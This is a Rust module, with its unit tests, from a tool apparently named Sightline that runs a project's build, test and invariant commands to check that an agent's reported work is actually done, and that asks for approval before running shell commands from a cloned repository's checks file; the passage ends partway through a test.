//! Whether the work is actually done, as opposed to reported as done.
//!
//! An agent saying it has finished is worth very little. The only signals worth
//! anything are external and mechanical: the build compiles, the tests pass,
//! the linter is quiet, continuous integration is green. This module runs those
//! and reports what happened, and it is deliberately incapable of judgement —
//! it cannot tell you the work is good, only that the checks passed, and the
//! moment it starts asking a model for an opinion the word "verified" stops
//! meaning anything.
//!
//! What the checks are belongs to the project, not to Sightline. They live in
//! `.sightline/checks.toml`, committed with the code, because a definition of
//! done that Sightline supplied would be Sightline's opinion of someone else's
//! project.
//!
//! ```toml
//! [[check]]
//! name    = "tests"
//! run     = "cargo test"
//! timeout = "10m"
//!
//! [[check]]
//! name     = "ci"
//! run      = "gh run list --branch $BRANCH --limit 1"
//! expect   = "success"
//! optional = true      # missing tooling is unknown, never failure
//! ```

use serde::Deserialize;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

/// Where a project says what finished means.
pub const FILE: &str = ".sightline/checks.toml";

/// Where it used to live, and still may.
///
/// A project's own files are committed with its code, so a repository written
/// before the rename has the old directory and there is no upgrade step anyone
/// would think to run. Both are read; only the new one is written.
pub const FORMER: &str = ".ironsight/checks.toml";

/// What a project is built and tested with, worked out from what is lying in
/// it, and the checks that follow.
///
/// A guess, and said to be one. Somebody who has to write a TOML file before
/// anything happens mostly does not, so the useful thing is to offer a first
/// draft of the obvious answer and let them correct it — not to be right about
/// every project on the first try.
pub fn guess_checks(root: &Path) -> Option<(&'static str, String)> {
    let has = |name: &str| root.join(name).exists();
    if has("Cargo.toml") {
        return Some((
            "Rust",
            [
                "[[check]]",
                "name    = \"format\"",
                "run     = \"cargo fmt --check\"",
                "timeout = \"2m\"",
                "",
                "[[check]]",
                "name    = \"tests\"",
                "run     = \"cargo test\"",
                "timeout = \"15m\"",
                "",
            ]
            .join("\n"),
        ));
    }
    if has("package.json") {
        return Some((
            "Node",
            [
                "[[check]]",
                "name    = \"tests\"",
                "run     = \"npm test\"",
                "timeout = \"10m\"",
                "",
            ]
            .join("\n"),
        ));
    }
    if has("pyproject.toml") || has("setup.py") || has("pytest.ini") || has("tox.ini") {
        return Some((
            "Python",
            [
                "[[check]]",
                "name    = \"tests\"",
                "run     = \"python3 -m pytest -q\"",
                "timeout = \"10m\"",
                "",
            ]
            .join("\n"),
        ));
    }
    if has("go.mod") {
        return Some((
            "Go",
            [
                "[[check]]",
                "name    = \"tests\"",
                "run     = \"go test ./...\"",
                "timeout = \"10m\"",
                "",
            ]
            .join("\n"),
        ));
    }
    if has("Makefile") || has("makefile") {
        return Some((
            "make",
            [
                "[[check]]",
                "name    = \"tests\"",
                "run     = \"make test\"",
                "timeout = \"10m\"",
                "",
            ]
            .join("\n"),
        ));
    }
    None
}

#[derive(Debug, Clone, Deserialize)]
pub struct Check {
    pub name: String,
    /// the command, run through the platform's shell
    pub run: String,
    #[serde(default)]
    timeout: Option<String>,
    /// when set, the output must contain this for the check to pass
    #[serde(default)]
    pub expect: Option<String>,
    /// tooling that may not be installed. Missing means unknown, not failed.
    #[serde(default)]
    pub optional: bool,
}

impl Check {
    /// Ten minutes unless the project says otherwise. Long enough for a real
    /// suite, short enough that a wedged check is noticed the same morning.
    pub fn timeout(&self) -> Duration {
        self.timeout
            .as_deref()
            .and_then(parse_duration)
            .unwrap_or(Duration::from_secs(600))
    }
}

/// `10m`, `90s`, `2h`, or plain seconds.
fn parse_duration(s: &str) -> Option<Duration> {
    let s = s.trim();
    let (number, scale) = match s.chars().last()? {
        'h' => (&s[..s.len() - 1], 3_600),
        'm' => (&s[..s.len() - 1], 60),
        's' => (&s[..s.len() - 1], 1),
        _ => (s, 1),
    };
    number
        .trim()
        .parse::<u64>()
        .ok()
        .map(|n| Duration::from_secs(n * scale))
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum State {
    Passed,
    /// with the first line that explains why, which is the line worth showing
    Failed {
        first: String,
    },
    /// could not be determined — missing tooling, or a check that would not
    /// start. Never treated as a pass and never as a failure.
    Unknown {
        why: String,
    },
}

impl State {
    pub fn label(&self) -> &'static str {
        match self {
            State::Passed => "passed",
            State::Failed { .. } => "failed",
            State::Unknown { .. } => "unknown",
        }
    }
}

#[derive(Debug, Clone)]
pub struct Outcome {
    pub name: String,
    pub state: State,
    pub ms: u64,
}

/// Something about this project that must never stop being true.
///
/// Different from a check in the direction it points. A check must pass, and a
/// passing check says only that the failures it can express did not happen. An
/// invariant is stated as the thing that must *not* be found — so its command
/// must fail, and a command that succeeds has demonstrated the very defect it
/// was written to look for.
///
/// That direction is what makes these worth having during a merge. "The tests
/// pass" survives an adapter that quietly broke a guarantee; "nothing journals
/// without taking the lock" does not, because it looks for the breakage rather
/// than for its symptoms.
#[derive(Debug, Clone, Deserialize)]
pub struct Invariant {
    pub name: String,
    /// What must be true, in words, for whoever reads the report.
    pub must: String,
    /// A command that must fail. If it succeeds, the invariant is broken and
    /// what it printed is the evidence.
    pub refute: String,
}

#[derive(Debug, Clone, Deserialize)]
pub struct Suite {
    #[serde(default, rename = "check")]
    pub checks: Vec<Check>,
    /// What must never stop being true here, each with the command that would
    /// show that it had.
    #[serde(default, rename = "invariant")]
    pub invariants: Vec<Invariant>,
    /// Exactly what was on disk, so trust can be about *these* commands rather
    /// than about a file name.
    #[serde(skip)]
    pub raw: String,
}

impl Suite {
    /// The project's checks, if it has said what they are.
    ///
    /// Looks in the directory given and then upwards, because a session may be
    /// working in a subdirectory of the project that defines them.
    pub fn find(from: &Path) -> Result<Option<(PathBuf, Suite)>, String> {
        let mut at = Some(from);
        while let Some(dir) = at {
            // The current name first: a project mid-rename has both, and the
            // one it is moving to is the one it means.
            let path = [FILE, FORMER]
                .iter()
                .map(|f| dir.join(f))
                .find(|p| p.is_file())
                .unwrap_or_else(|| dir.join(FILE));
            if path.is_file() {
                let text = std::fs::read_to_string(&path).map_err(|e| e.to_string())?;
                let mut suite: Suite =
                    toml::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
                // Kept so that trust can be about these commands rather than
                // about a file that once held different ones.
                suite.raw = text;
                return Ok(Some((dir.to_path_buf(), suite)));
            }
            at = dir.parent();
        }
        Ok(None)
    }

    pub fn get(&self, name: &str) -> Option<&Check> {
        self.checks.iter().find(|c| c.name == name)
    }

    /// Run every check, in the order the project wrote them.
    pub fn run(&self, cwd: &Path, env: &HashMap<String, String>) -> Vec<Outcome> {
        self.checks.iter().map(|c| run(c, cwd, env)).collect()
    }

    /// Try to break every invariant, and report what happened to each.
    ///
    /// A boring answer — a list of things that did not fire — is the one you
    /// want. Anything that fired is a guarantee that has stopped being true.
    pub fn hold(&self, cwd: &Path, env: &HashMap<String, String>) -> Vec<Held> {
        self.invariants
            .iter()
            .map(|i| {
                let (verdict, ms) = refute(&i.refute, cwd, env);
                Held {
                    name: i.name.clone(),
                    must: i.must.clone(),
                    verdict,
                    ms,
                }
            })
            .collect()
    }

    /// Whether these outcomes amount to done.
    ///
    /// Unknown is not done. A check that could not be run has not passed, and
    /// treating it as though it had is the one mistake that would make the word
    /// "verified" a lie.
    pub fn verified(outcomes: &[Outcome]) -> bool {
        !outcomes.is_empty() && outcomes.iter().all(|o| o.state == State::Passed)
    }

    /// The first thing that went wrong, for the note that goes back to whoever
    /// claimed the work.
    pub fn refusal(outcomes: &[Outcome]) -> Option<String> {
        outcomes.iter().find_map(|o| match &o.state {
            State::Failed { first } => Some(format!("{} failed · {first}", o.name)),
            State::Unknown { why } => Some(format!("{} could not be run · {why}", o.name)),
            State::Passed => None,
        })
    }
}

/// What happened when one invariant was tested.
#[derive(Debug, Clone)]
pub struct Held {
    pub name: String,
    pub must: String,
    pub verdict: Verdict,
    pub ms: u64,
}

impl Held {
    /// Whether this one is broken. `Unrunnable` is neither — a command that
    /// would not start has shown nothing either way, and calling that "holds"
    /// is how an invariant nobody can test starts vouching for everything.
    pub fn broken(&self) -> bool {
        matches!(self.verdict, Verdict::Refuted { .. })
    }
}

/// Whether every invariant that could be tested survived.
///
/// Says nothing about the ones that could not be run; the caller has to look at
/// those itself, because they are the case where a silent answer is wrong.
pub fn all_held(held: &[Held]) -> bool {
    !held.iter().any(Held::broken)
}

/// What happened when something written to show the work is wrong was tried.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// It did not fire. The claim survives this particular attempt to break it,
    /// which is the strongest thing anything here can say — and is still not
    /// "the work is good".
    Stands,
    /// It fired. Whatever defect it was written to find is present.
    Refuted { how: String },
    /// It could not be run, so it refutes nothing and confirms nothing.
    Unrunnable { why: String },
}

/// Try to show that work is wrong.
///
/// The command must fail. A refutation is written to succeed only when the
/// defect it hunts is there, so a refutation that *passes* is bad news — and
/// this is the inversion that makes a definition of done capable of failing.
/// A suite of checks can only say "the failures I can express did not happen";
/// this says "here is what being wrong would look like, and it does not look
/// like that."
pub fn refute(command: &str, cwd: &Path, env: &HashMap<String, String>) -> (Verdict, u64) {
    let check = Check {
        name: "refutation".into(),
        run: command.to_string(),
        timeout: None,
        expect: None,
        // Not because it is optional — a refutation never is — but because
        // this is the flag that makes "the command does not exist" report as
        // unknown rather than as a failure. A refutation that cannot run would
        // otherwise be indistinguishable from one that ran and found nothing,
        // and a typo would read as evidence that the work is right. That is
        // the same mistake as trusting a passing suite, one level down.
        optional: true,
    };
    let outcome = run(&check, cwd, env);
    let verdict = match outcome.state {
        // It ran, and it succeeded: it found what it was looking for.
        State::Passed => Verdict::Refuted {
            how: crate::event::clip(command, 200),
        },
        State::Failed { .. } => Verdict::Stands,
        State::Unknown { why } => Verdict::Unrunnable { why },
    };
    (verdict, outcome.ms)
}

// ── trust ──────────────────────────────────────────────────────────────────
//
// A checks file is a list of shell commands that arrives with a repository.
// Cloning something and asking whether it passes its own checks should not run
// whatever its author felt like running, so it does not — until you have said
// so, for those exact commands.
//
// What is remembered is the file's contents, not its path and not a hash of it.
// A path says nothing about what it now contains, and a hash of a few hundred
// bytes buys nothing here except the chance of being wrong. If a single
// character of the file changes, the commands are not the ones that were
// approved and it asks again.

fn ledger() -> PathBuf {
    crate::app::data_dir().join("trusted-checks.json")
}

fn approved_at(ledger: &Path) -> HashMap<String, String> {
    std::fs::read_to_string(ledger)
        .map(|t| approved_from(&t))
        .unwrap_or_default()
}

/// The ledger's text, read as approvals.
///
/// Anything that does not parse is nothing approved, never something approved:
/// this is the one direction of failure that is safe here.
fn approved_from(text: &str) -> HashMap<String, String> {
    serde_json::from_str(text).unwrap_or_default()
}

/// Whether these exact commands, in this project, have been approved.
pub fn trusted(root: &Path, suite: &Suite) -> bool {
    trusted_at(&ledger(), root, suite)
}

fn trusted_at(ledger: &Path, root: &Path, suite: &Suite) -> bool {
    approved_at(ledger).get(&root.to_string_lossy().to_string()) == Some(&suite.raw)
}

/// Approve what is in a project's checks file as it stands now.
///
/// Written through a temporary file and renamed into place, because this is one
/// ledger shared by every Sightline on the machine — a window, a command in a
/// shell, a daemon — and `write` truncates before it fills. A reader arriving in
/// that gap gets half a file, which does not parse, which reads as *nothing
/// approved*. That fails closed, so it is safe, but a project silently losing
/// its approval is indistinguishable from never having had it.
///
/// The ledger is re-read here rather than reused from before the caller's
/// deliberation, so approving one project does not undo an approval another
/// process made while this one was deciding. A gap remains between that read and
/// the rename; closing it needs a lock, and the cost of losing that race is one
/// approval that has to be given again rather than something unsafe.
pub fn trust(root: &Path, suite: &Suite) -> Result<(), String> {
    trust_at(&ledger(), root, suite)
}

/// The same, against a named ledger.
///
/// Split out so the concurrency this is careful about can be tested against a
/// ledger of its own. A test that shares the machine's real one is testing the
/// rest of the suite as much as the code, and fails for reasons that have
/// nothing to do with either.
fn trust_at(path: &Path, root: &Path, suite: &Suite) -> Result<(), String> {
    // One writer at a time within this process, which covers the window, the
    // daemon and their threads. Across processes the rename below still makes
    // every read whole; what remains is a lost update between the read and the
    // rename, and the cost of losing that race is an approval given twice.
    static WRITING: std::sync::Mutex<()> = std::sync::Mutex::new(());
    let _held = match WRITING.lock() {
        Ok(g) => g,
        Err(e) => e.into_inner(),
    };
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    let mut all = approved_at(path);
    all.insert(root.to_string_lossy().into_owned(), suite.raw.clone());
    let text = serde_json::to_string_pretty(&all).map_err(|e| e.to_string())?;

    // Unique per call, not per process: two writers naming the same staging file
    // means the first rename takes it and the second finds nothing there, which
    // fails the approval for a reason that has nothing to do with the approval.
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let staged = path.with_extension(format!(
        "tmp.{}.{}",
        std::process::id(),
        NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
    ));
    std::fs::write(&staged, text).map_err(|e| e.to_string())?;
    match std::fs::rename(&staged, path) {
        Ok(()) => Ok(()),
        Err(e) => {
            let _ = std::fs::remove_file(&staged);
            Err(e.to_string())
        }
    }
}

/// What to say to someone whose checks have not been approved.
pub fn untrusted_hint(root: &Path, suite: &Suite) -> String {
    // Invariants are shell from the same file and arrived with the same
    // someone else's code. Counting only the checks would have the gate approve
    // nine commands it never mentioned, which is the gate failing at the one
    // thing it is for.
    let names: Vec<&str> = suite
        .checks
        .iter()
        .map(|c| c.name.as_str())
        .chain(suite.invariants.iter().map(|i| i.name.as_str()))
        .collect();
    format!(
        "{} has not been approved. It would run {} shell command(s) from {}: {}. \
         Read them, then: sightline trust {}",
        root.display(),
        names.len(),
        FILE,
        names.join(", "),
        root.display()
    )
}

/// Run one check, with a timeout it cannot outlive.
pub fn run(check: &Check, cwd: &Path, env: &HashMap<String, String>) -> Outcome {
    let started = Instant::now();
    let state = execute(check, cwd, env);
    Outcome {
        name: check.name.clone(),
        state,
        ms: started.elapsed().as_millis() as u64,
    }
}

fn shell(command: &str) -> Command {
    if cfg!(windows) {
        let mut c = Command::new("cmd");
        c.args(["/C", command]);
        c
    } else {
        let mut c = Command::new("sh");
        c.args(["-c", command]);
        c
    }
}

/// Every run gets a place of its own to write to. Naming it after the check
/// would collide the moment two sessions were verified at once — which is the
/// ordinary case for a foreman watching a fleet, and which showed up first as
/// a check whose output had been truncated by another check of the same name.
static RUNS: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// The two temp files a check writes to, removed whenever this goes out of
/// scope — so every early return cleans up, not only the happy path.
struct TempPair {
    out: PathBuf,
    err: PathBuf,
}

impl TempPair {
    fn new(out: PathBuf, err: PathBuf) -> Self {
        TempPair { out, err }
    }
}

impl Drop for TempPair {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.out);
        let _ = std::fs::remove_file(&self.err);
    }
}

/// Kill a check and everything it forked, then reap it.
///
/// On Unix the child leads its own process group (set in `pre_exec`), so
/// signalling the negative pid reaches the shell and every descendant — a build
/// that spawned compilers, a test runner that spawned workers. Killing only the
/// shell would leave those reparented to init and still running.
fn kill_tree(child: &mut std::process::Child) {
    #[cfg(unix)]
    unsafe {
        libc::killpg(child.id() as libc::pid_t, libc::SIGKILL);
    }
    let _ = child.kill();
    let _ = child.wait();
}

fn execute(check: &Check, cwd: &Path, env: &HashMap<String, String>) -> State {
    // Output goes to files rather than pipes. A check that writes more than a
    // pipe will hold — a test suite, a build — would otherwise block forever
    // waiting for a reader that is busy waiting for it to exit.
    let nth = RUNS.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let base = std::env::temp_dir().join(format!("sightline-check-{}-{nth}", std::process::id()));
    // Unlinked however this function returns — a failed spawn, a wait error, a
    // half-created pair — not only on the happy path.
    let temp = TempPair::new(base.with_extension("out"), base.with_extension("err"));
    let (Ok(out), Ok(err)) = (
        std::fs::File::create(&temp.out),
        std::fs::File::create(&temp.err),
    ) else {
        return State::Unknown {
            why: "nowhere to write the output".into(),
        };
    };

    let mut command = shell(&check.run);
    command
        .current_dir(cwd)
        .envs(env)
        .stdin(Stdio::null())
        .stdout(Stdio::from(out))
        .stderr(Stdio::from(err));
    // Its own process group, so a timeout can kill everything the shell forked
    // — cargo, rustc, node — rather than only the shell, which would leave the
    // real workers reparented to init and still burning the machine.
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        unsafe {
            command.pre_exec(|| {
                if libc::setsid() == -1 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    let mut child = match command.spawn() {
        Ok(c) => c,
        Err(e) => {
            return State::Unknown {
                why: format!("could not start: {e}"),
            };
        }
    };

    let deadline = Instant::now() + check.timeout();
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break Some(status),
            Ok(None) if Instant::now() >= deadline => {
                kill_tree(&mut child);
                break None;
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(50)),
            Err(e) => {
                // Reap before returning: dropping a Child does not wait, so the
                // process would otherwise linger as a zombie until Sightline
                // exits. The temp files are cleaned by TempPair's drop.
                kill_tree(&mut child);
                return State::Unknown {
                    why: format!("could not be waited on: {e}"),
                };
            }
        }
    };

    let stdout = std::fs::read_to_string(&temp.out).unwrap_or_default();
    let stderr = std::fs::read_to_string(&temp.err).unwrap_or_default();

    let Some(status) = status else {
        return State::Failed {
            first: format!("timed out after {}s", check.timeout().as_secs()),
        };
    };

    // A check that names what it expects is judged on that rather than on an
    // exit code, because the tool it asks may exit zero while saying no.
    if let Some(want) = &check.expect {
        return if stdout.contains(want.as_str()) || stderr.contains(want.as_str()) {
            State::Passed
        } else if check.optional && !status.success() && stdout.is_empty() {
            State::Unknown {
                why: format!("no answer containing {want:?}"),
            }
        } else {
            State::Failed {
                first: first_failure(&stdout, &stderr)
                    .unwrap_or_else(|| format!("nothing said {want:?}")),
            }
        };
    }

    if status.success() {
        State::Passed
    } else if check.optional && missing_tool(&stderr) {
        State::Unknown {
            why: first_failure(&stdout, &stderr).unwrap_or_else(|| "not installed".into()),
        }
    } else {
        State::Failed {
            first: first_failure(&stdout, &stderr)
                .unwrap_or_else(|| format!("exited {}", code_of(&status))),
        }
    }
}

fn code_of(status: &std::process::ExitStatus) -> String {
    status
        .code()
        .map(|c| c.to_string())
        .unwrap_or_else(|| "on a signal".into())
}

/// Whether the shell is telling us the tool is not there, as opposed to the
/// tool telling us the work is wrong.
fn missing_tool(stderr: &str) -> bool {
    let lower = stderr.to_lowercase();
    [
        "not found",
        "no such file",
        "is not recognized",
        "command not found",
    ]
    .iter()
    .any(|m| lower.contains(m))
}

/// The one line worth putting in front of whoever claimed the work.
///
/// Compilers, test runners and linters all announce trouble differently, so
/// this looks for the words they share and falls back to the first thing said
/// on the error channel — which is nearly always the right line.
pub fn first_failure(stdout: &str, stderr: &str) -> Option<String> {
    // Deliberately no "warning: unused": rustc prints warnings before errors, so
    // matching one would return it as the reason a build failed while the real
    // error sat below. A warning alone never fails a build — this only runs on a
    // non-zero exit — so the marker could only ever mask the error it precedes.
    const MARKERS: [&str; 6] = [
        "error",
        "FAILED",
        "failures:",
        "panicked",
        "assertion",
        "Error:",
    ];
    for text in [stderr, stdout] {
        for line in text.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            if MARKERS.iter().any(|m| trimmed.contains(m)) {
                return Some(crate::event::clip(trimmed, 240));
            }
        }
    }
    for text in [stderr, stdout] {
        if let Some(line) = text.lines().find(|l| !l.trim().is_empty()) {
            return Some(crate::event::clip(line.trim(), 240));
        }
    }
    None
}

#[cfg(test)]
mod invariant_tests {
    use super::*;

    fn suite_of(toml: &str) -> Suite {
        toml::from_str(toml).expect("it parses")
    }

    #[test]
    fn an_invariant_that_fires_is_a_guarantee_that_has_gone() {
        // The direction is the whole point and the easiest thing to get
        // backwards: the command must FAIL. One that succeeds has found the
        // defect it was written to look for.
        let suite = suite_of(
            r#"
            [[invariant]]
            name   = "broken"
            must   = "this must never be found"
            refute = "true"

            [[invariant]]
            name   = "intact"
            must   = "nor this"
            refute = "false"
            "#,
        );
        let held = suite.hold(Path::new("."), &HashMap::new());
        assert_eq!(held.len(), 2);
        assert!(held[0].broken(), "a command that succeeded found something");
        assert!(
            !held[1].broken(),
            "one that failed found nothing, which is the good news"
        );
        assert!(!all_held(&held));
        assert!(all_held(&held[1..]));
    }

    #[test]
    fn an_invariant_nobody_can_test_vouches_for_nothing() {
        // Unrunnable is neither held nor broken. Counting it as held is how an
        // instrument that cannot fire starts guaranteeing everything — the same
        // mistake the fire-once rule exists to prevent one level down.
        let suite = suite_of(
            r#"
            [[invariant]]
            name   = "needs a tool nobody has"
            must   = "something"
            refute = "this-command-does-not-exist-anywhere"
            "#,
        );
        let held = suite.hold(Path::new("."), &HashMap::new());
        assert!(matches!(held[0].verdict, Verdict::Unrunnable { .. }));
        assert!(!held[0].broken(), "it has not shown a breakage");
        assert!(
            all_held(&held),
            "nor has it shown one, so it does not fail the run on its own — \
             the caller has to say it could not be tested"
        );
    }

    #[test]
    fn a_file_with_no_invariants_is_ordinary_rather_than_broken() {
        // Every project that already had a checks file has none of these, and
        // must keep working exactly as before.
        let suite = suite_of(
            r#"
            [[check]]
            name = "tests"
            run  = "cargo test"
            "#,
        );
        assert!(suite.invariants.is_empty());
        assert!(all_held(&suite.hold(Path::new("."), &HashMap::new())));
    }

    #[test]
    fn approving_a_project_counts_the_invariants_too() {
        // They are shell from the same file, arriving with the same someone
        // else's code. A gate that approved nine commands without naming them
        // has failed at the one thing it is for.
        let suite = suite_of(
            r#"
            [[check]]
            name = "tests"
            run  = "cargo test"

            [[invariant]]
            name   = "no async runtime"
            must   = "core stays synchronous"
            refute = "grep -q tokio Cargo.toml"
            "#,
        );
        let hint = untrusted_hint(Path::new("/w"), &suite);
        assert!(
            hint.contains("2 shell command(s)"),
            "both are counted: {hint}"
        );
        assert!(
            hint.contains("no async runtime"),
            "and the invariant is named"
        );
    }
}

#[cfg(test)]
mod tests {

    #[test]
    fn approving_one_project_does_not_unapprove_another() {
        // The ledger is shared by every Sightline on the machine. Read-modify-
        // write from a stale snapshot loses whichever approval was made while
        // this one was deciding, and the symptom is a project that was trusted
        // yesterday asking again today for no reason anyone can see.
        let base = std::env::temp_dir().join(format!(
            "sightline-ledger-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&base).unwrap();
        let ledger = base.join("trusted-checks.json");

        let mut made = |name: &str| {
            let d = base.join(name);
            std::fs::create_dir_all(d.join(".sightline")).unwrap();
            std::fs::write(
                d.join(FILE),
                format!("[[check]]\nname = \"{name}\"\nrun = \"true\"\n"),
            )
            .unwrap();
            let suite = Suite::find(&d).unwrap().unwrap().1;
            (d, suite)
        };
        let (a, one) = made("a");
        let (b, two) = made("b");

        trust_at(&ledger, &a, &one).unwrap();
        trust_at(&ledger, &b, &two).unwrap();

        let all = approved_at(&ledger);
        assert_eq!(
            all.get(&a.to_string_lossy().to_string()),
            Some(&one.raw),
            "the first approval was lost when the second was made"
        );
        assert_eq!(all.get(&b.to_string_lossy().to_string()), Some(&two.raw));

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn a_half_written_ledger_trusts_nothing_rather_than_something() {
        // Whatever else goes wrong, the direction of failure is the one that
        // refuses. A ledger that cannot be parsed must not read as an approval.
        let torn = "{\"/some/project\": \"[[check]]\nname = \"";
        let parsed: Result<std::collections::HashMap<String, String>, _> =
            serde_json::from_str(torn);
        assert!(parsed.is_err(), "this fixture is supposed to be torn");
        assert!(
            approved_from(torn).is_empty(),
            "a torn ledger approved something"
        );
    }

    #[test]
    fn a_project_written_before_the_rename_still_has_checks() {
        // Its .ironsight/ directory is committed with its code and there is no
        // upgrade step anyone would think to run, so both names are read.
        let dir = std::env::temp_dir().join(format!("sightline-former-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".ironsight")).unwrap();
        std::fs::write(
            dir.join(FORMER),
            "[[check]]\nname = \"tests\"\nrun = \"cargo test\"\n",
        )
        .unwrap();
        let found = Suite::find(&dir).unwrap();
        assert!(found.is_some(), "the old directory was not read");
        assert_eq!(found.unwrap().1.checks[0].name, "tests");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_current_name_wins_when_a_project_has_both() {
        let dir = std::env::temp_dir().join(format!("sightline-both-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".ironsight")).unwrap();
        std::fs::create_dir_all(dir.join(".sightline")).unwrap();
        std::fs::write(dir.join(FORMER), "[[check]]\nname = \"old\"\nrun = \"x\"\n").unwrap();
        std::fs::write(dir.join(FILE), "[[check]]\nname = \"new\"\nrun = \"x\"\n").unwrap();
        let (_, suite) = Suite::find(&dir).unwrap().unwrap();
        assert_eq!(
            suite.checks[0].name, "new",
            "a project mid-rename means the one it is moving to"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }
    use super::*;

    fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("sightline-checks-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".sightline")).unwrap();
        dir
    }

    fn write(dir: &Path, toml: &str) {
        std::fs::write(dir.join(FILE), toml).unwrap();
    }

    fn none() -> HashMap<String, String> {
        HashMap::new()
    }

    #[test]
    fn reads_what_a_project_calls_done() {
        let dir = scratch("parse");
        write(
            &dir,
            r#"
[[check]]
name = "build"
run = "cargo build"

[[check]]
name = "ci"
run = "gh run list"
expect = "success"
optional = true
timeout = "2m"
"#,
        );
        let (root, suite) = Suite::find(&dir).unwrap().expect("a suite is found");
        assert_eq!(root, dir);
        assert_eq!(suite.checks.len(), 2);
        assert_eq!(suite.get("build").unwrap().run, "cargo build");
        assert_eq!(
            suite.get("build").unwrap().timeout().as_secs(),
            600,
            "the default"
        );
        let ci = suite.get("ci").unwrap();
        assert_eq!(ci.timeout().as_secs(), 120);
        assert!(ci.optional);
        assert_eq!(ci.expect.as_deref(), Some("success"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn is_found_from_a_subdirectory_of_the_project() {
        let dir = scratch("upwards");
        write(&dir, "[[check]]\nname = \"x\"\nrun = \"true\"\n");
        let deep = dir.join("crates").join("core").join("src");
        std::fs::create_dir_all(&deep).unwrap();
        let (root, _) = Suite::find(&deep).unwrap().expect("found by walking up");
        assert_eq!(
            root, dir,
            "a session working deep in a tree is still in the project"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_project_that_has_said_nothing_has_no_checks() {
        let dir = std::env::temp_dir().join("sightline-checks-silent");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Nothing is asserted about the parents of a temp directory, so this
        // only asserts that a missing file is not an error.
        assert!(Suite::find(&dir).is_ok());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_passing_check_passes_and_a_failing_one_says_why() {
        let dir = scratch("run");
        let suite = Suite {
            raw: String::new(),
            invariants: Vec::new(),
            checks: vec![
                Check {
                    name: "good".into(),
                    run: "echo all is well".into(),
                    timeout: None,
                    expect: None,
                    optional: false,
                },
                Check {
                    name: "bad".into(),
                    run: "echo 'error[E0308]: mismatched types' >&2; exit 1".into(),
                    timeout: None,
                    expect: None,
                    optional: false,
                },
            ],
        };
        let outcomes = suite.run(&dir, &none());
        assert_eq!(outcomes[0].state, State::Passed);
        match &outcomes[1].state {
            State::Failed { first } => assert!(
                first.contains("E0308"),
                "the line that explains it is the line kept: {first}"
            ),
            other => panic!("expected a failure, got {other:?}"),
        }
        assert!(!Suite::verified(&outcomes), "one failure is not done");
        assert!(Suite::refusal(&outcomes).unwrap().starts_with("bad failed"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_timeout_kills_what_the_check_forked_not_only_the_shell() {
        let dir = scratch("tree");
        // The shell backgrounds a sleep and waits; on timeout the whole group
        // must die, so the marker file the sleep would create never appears.
        let marker = dir.join("survived");
        let check = Check {
            name: "forks".into(),
            run: format!("sh -c 'sleep 10; touch {}' & sleep 10", marker.display()),
            timeout: Some("1s".into()),
            expect: None,
            optional: false,
        };
        let outcome = run(&check, &dir, &none());
        assert!(
            matches!(outcome.state, State::Failed { .. }),
            "it timed out"
        );
        // Give any orphan the time it would have needed to fire.
        std::thread::sleep(Duration::from_millis(200));
        assert!(
            !marker.exists(),
            "a forked descendant survived the timeout and kept running"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_check_that_will_not_finish_is_a_failure_with_a_reason() {
        let dir = scratch("timeout");
        let check = Check {
            name: "hangs".into(),
            run: "sleep 30".into(),
            timeout: Some("1s".into()),
            expect: None,
            optional: false,
        };
        let outcome = run(&check, &dir, &none());
        match outcome.state {
            State::Failed { first } => assert!(first.contains("timed out"), "{first}"),
            other => panic!("expected a timeout, got {other:?}"),
        }
        assert!(
            outcome.ms < 20_000,
            "it was actually killed, not waited out"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn commands_are_not_run_until_those_exact_commands_are_approved() {
        let dir = scratch("trust");
        // A private ledger, named rather than arranged by moving the whole
        // process's data directory. This used to set SIGHTLINE_DATA_DIR, which
        // is global: while it ran, every other test's idea of where the ledger
        // lives moved with it, so an approval written by one test went to this
        // scratch store and was looked for in the real one. That is what made
        // the suite fail roughly half the time, from a test that had nothing to
        // do with trust.
        let led = dir.join("state").join("trusted-checks.json");

        write(&dir, "[[check]]\nname = \"tests\"\nrun = \"cargo test\"\n");
        let (root, suite) = Suite::find(&dir).unwrap().unwrap();
        assert!(
            !trusted_at(&led, &root, &suite),
            "a checks file arrives untrusted"
        );
        assert!(
